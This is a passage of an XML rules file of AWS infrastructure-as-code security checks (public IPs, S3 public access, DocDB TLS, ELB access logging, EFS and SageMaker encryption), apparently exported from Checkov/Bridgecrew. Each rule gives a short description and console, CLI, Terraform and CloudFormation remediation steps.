<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/vpc" target="_self">Amazon VPC console</a>.</li>
<li>In the navigation pane, select <strong>Subnets</strong>.</li>
<li>Select a <strong>subnet</strong>, then select <strong>Subnet Actions</strong> &gt; <strong>Modify auto-assign IP settings</strong>.</li>
<li>Select <strong>auto-assign public IPv4 address</strong>. When selected, requests a public IPv4 address for all instances launched into the selected subnet. Select or clear the setting as required.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_instance</li>
<li><strong>Argument:</strong> associate_public_ip_address - (Optional) Associate a public ip address with an instance in a VPC. Boolean value. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_instance" "bar" {
  ...
- associate_public_ip_address = true
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::EC2::Instance / AWS::EC2::LaunchTemplate</li>
<li><strong>Argument:</strong> NetworkInterfaces.AssociatePublicIpAddress - (Optional) Associate a public ip address with an instance in a VPC. Boolean value. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  EC2Instance:
    Type: AWS::EC2::Instance
    Properties: 
      ...
      NetworkInterfaces: 
        - ...
-                   AssociatePublicIpAddress: true

  EC2LaunchTemplate:
    Type: AWS::EC2::LaunchTemplate
    Properties:
      LaunchTemplateData:
        ...
        NetworkInterfaces: 
          - ...
-           AssociatePublicIpAddress: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/public_12' target='_blank'> https://docs.bridgecrew.io/docs/public_12</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/public_12' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_56</key>
    <name>Ensure S3 bucket RestrictPublicBucket is set to True</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="s3-bucket-restrictpublicbucket-is-not-set-to-true"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-s-3-bucket-restrict-public-bucket-is-not-set-to-true"></div>S3 bucket RestrictPublicBucket is not set to True</div><a aria-label="Skip link to S3 bucket RestrictPublicBucket is not set to True" class="heading-anchor-icon fa fa-anchor" href="#s3-bucket-restrictpublicbucket-is-not-set-to-true"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The S3 Block Public Access configuration enables specifying whether S3 should restrict public bucket policies for buckets in this account. Setting  RestrictPublicBucket to TRUE restricts access to buckets with public policies to only AWS services and authorized users within this account.</p>
<p>Enabling this setting does not affect previously stored bucket policies.  Public and cross-account access within any public bucket policy, including non-public delegation to specific accounts, is blocked.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_s3_bucket_public_access_block</li>
<li><strong>Argument:</strong> restrict_public_buckets </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket_public_access_block.artifacts.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket_public_access_block.artifacts.tf">resource "aws_s3_bucket_public_access_block" "artifacts" {
  ...
+ restrict_public_buckets = true
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::S3::Bucket</li>
<li><strong>Argument:</strong> Properties.PublicAccessBlockConfiguration.RestrictPublicBuckets</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: 'AWS::S3::Bucket'
    Properties:
      ...
      PublicAccessBlockConfiguration:
        ...
+       RestrictPublicBuckets: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_s3_22' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_s3_22</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_s3_22' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_90</key>
    <name>Ensure DocDB TLS is not disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="docdb-tls-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-doc-db-tls-is-disabled"></div>DocDB TLS is disabled</div><a aria-label="Skip link to DocDB TLS is disabled" class="heading-anchor-icon fa fa-anchor" href="#docdb-tls-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TLS can be used to encrypt the connection between an application and a DocDB cluster. By default, encryption in transit is enabled for newly created clusters. It can optionally be disabled when the cluster is created, or at a later time. When enabled, secure connections using TLS are required to connect to the cluster. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Sign in to the AWS Management Console, and open the Amazon DocumentDB console at <a href="https://console.aws.amazon.com/docdb" target="_self">https://console.aws.amazon.com/docdb</a>.</li>
<li>In the left navigation pane, choose Clusters.</li>
<li>In the list of clusters, select the name of your cluster.</li>
<li>The resulting page shows the details of the cluster that you selected. Scroll down to Cluster details. At the bottom of that section, locate the parameter group's name below Cluster parameter group.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws docdb describe-db-clusters \
    --db-cluster-identifier sample-cluster \
    --query 'DBClusters[*].[DBClusterIdentifier,DBClusterParameterGroup]'
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: aws_docdb_cluster_parameter_group</li>
<li>Argument: parameter - (Optional) A list of documentDB parameters to apply.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_docdb_cluster_parameter_group" "example" {
  ...
  name        = "example"
+ parameter {
+   name  = "tls"
+   value = "enabled"
+  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li>Resource: AWS::DocDB::DBClusterParameterGroup</li>
<li>Argument: Parameters.tls</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  DocDBParameterGroupEnabled:
    Type: AWS::DocDB::DBClusterParameterGroup
    Properties: 
        ...
      Parameters: 
        ...
-       tls: "disabled"
+               tls: "enabled"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_networking_37' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_networking_37</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_networking_37' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_91</key>
    <name>Ensure AWS ELB (Classic) with access log is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-elb-classic-with-access-log-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-elb-classic-with-access-log-is-disabled"></div>AWS ELB (Classic) with access log is disabled</div><a aria-label="Skip link to AWS ELB (Classic) with access log is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-elb-classic-with-access-log-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>ELBv2 provide access logs that capture information about the TLS requests sent to NLBs. These access logs can be used to analyze traffic patterns and troubleshoot security and operational issues.<br/>
Access logging is an optional feature of ELB that is disabled by default. There is no additional charge for access logs. You are charged storage costs for Amazon S3, but not charged for the bandwidth.<br/>
After you enable access logging for your load balancer, ELBv2 captures the logs as compressed files and stores them in the Amazon S3 bucket that you specify.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Go to the Amazon EC2 console at <a href="https://console.aws.amazon.com/ec2/" target="_self">https://console.aws.amazon.com/ec2/</a>.<br/>
In the navigation pane, choose Load Balancers.</li>
<li>Select your load balancer.</li>
<li>On the Description tab, choose Edit attributes.</li>
<li>On the Edit load balancer attributes page, do the following:</li>
<li>For Access logs, choose Enable and specify the name of an existing bucket or a name for a new bucket.</li>
<li>Choose Save.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws elbv2 modify-load-balancer-attributes --load-balancer-arn arn:aws:elasticloadbalancing:us-west-2:123456789012:loadbalancer/app/my-load-balancer/50dc6c495c0c9188 --attributes Key=access_logs.s3.enabled,Value=true Key=access_logs.s3.bucket,Value=my-loadbalancer-logs Key=access_logs.s3.prefix,Value=myapp
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_lb</li>
<li><strong>Argument:</strong> access_logs - (Optional) An Access Logs block. Access Logs documented below.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_lb" "test" {
  ...
  name               = "test-lb-tf"
+ access_logs {
+   bucket  = aws_s3_bucket.lb_logs.bucket
+   prefix  = "test-lb"
+   enabled = true
+ }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<p><em>Resource: AWS::ElasticLoadBalancingV2::LoadBalancer<br/>
</em>Argument: Properties.LoadBalancerAttributes</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Resource0:
    Type: 'AWS::ElasticLoadBalancingV2::LoadBalancer'
    Properties:
      ...
      LoadBalancerAttributes:
+     - Key: access_logs.s3.enabled
+       Value: "true"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_logging_22' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_logging_22</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_logging_22' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_92</key>
    <name>Ensure the ELB has access logging enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="the-elb-does-not-have-access-logging-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-the-elb-does-not-have-access-logging-enabled"></div>The ELB does not have access logging enabled</div><a aria-label="Skip link to The ELB does not have access logging enabled" class="heading-anchor-icon fa fa-anchor" href="#the-elb-does-not-have-access-logging-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p> These access logs can be used to analyze traffic patterns and troubleshoot security and operational issues.<br/>
Access logging is an optional feature of ELB that is disabled by default.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>TBA</p>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_elb</li>
<li><strong>Argument</strong>: access_logs</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_elb.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_elb.test.tf">resource "aws_elb" "example" {
  ...
  name = "test-lb-tf"
+  access_logs {
+     bucket  = aws_s3_bucket.lb_logs.bucket
+     enabled = true
+  }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::ElasticLoadBalancing::LoadBalancer</li>
<li><strong>Argument</strong>: Properties.AccessLoggingPolicy.Enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Resource0:
    Type: 'AWS::ElasticLoadBalancing::LoadBalancer'
    Properties:
      ...
      AccessLoggingPolicy:
        ...
+       Enabled: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_logging_23' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_logging_23</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_logging_23' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_97</key>
    <name>Ensure EFS volumes in ECS task definitions have encryption in transit enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="efs-volumes-in-ecs-task-definitions-do-not-have-encryption-in-transit-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-efs-volumes-in-ecs-task-definitions-do-not-have-encryption-in-transit-enabled"></div>EFS volumes in ECS task definitions do not have encryption in transit enabled</div><a aria-label="Skip link to EFS volumes in ECS task definitions do not have encryption in transit enabled" class="heading-anchor-icon fa fa-anchor" href="#efs-volumes-in-ecs-task-definitions-do-not-have-encryption-in-transit-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This check examines ECS tasks, and checks the definitions for EFS and if attached that the transit is encrypted.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource: </strong> aws_ecs_task_definition</li>
<li><strong>Argument:</strong> efs_volume_configuration/transit_encryption needs to ENABLED if there is an attached EFS.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_ecs_task_definition" "example" {
  ...
  family                = "service"
  volume {
        ...
+     transit_encryption      = "ENABLED"
      }
    }
  }
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource: </strong> AWS::ECS::TaskDefinition</li>
<li><strong>Argument:</strong> Properties.Volumes.EFSVolumeConfiguration.TransitEncryption.EFSVolumeConfiguration needs to ENABLED if there is an attached EFS.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  TaskDefinition:
    Type: AWS::ECS::TaskDefinition
    Properties:
      ...
      Volumes: 
        - ...
          EFSVolumeConfiguration:
            ...
+           TransitEncryption: "ENABLED"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_39' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_39</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_39' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_98</key>
    <name>Ensure AWS SageMaker notebook instance is configured with data encryption at rest using KMS key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-sagemaker-notebook-instance-is-not-configured-with-data-encryption-at-rest-using-kms-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-sage-maker-notebook-instance-is-not-configured-with-data-encryption-at-rest-using-kms-key"></div>AWS SageMaker notebook instance is not configured with data encryption at rest using KMS key</div><a aria-label="Skip link to AWS SageMaker notebook instance is not configured with data encryption at rest using KMS key" class="heading-anchor-icon fa fa-anchor" href="#aws-sagemaker-notebook-instance-is-not-configured-with-data-encryption-at-rest-using-kms-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This is a straight-forward check to ensure data encryption for Sagemaker notebooks, this check verifies that the cluster is encrypted with a Customer managed Key (CMK).</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>There is no current way of enabling encryption on an existing notebook, it will need to be recreated.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource: </strong> aws_sagemaker_endpoint_configuration</li>
<li><strong>Argument:</strong> kms_key_arn, specifying a KMS key will ensure data encryption.</li>
</ul>
<p>This modification will result in the resource being recreated.</p>
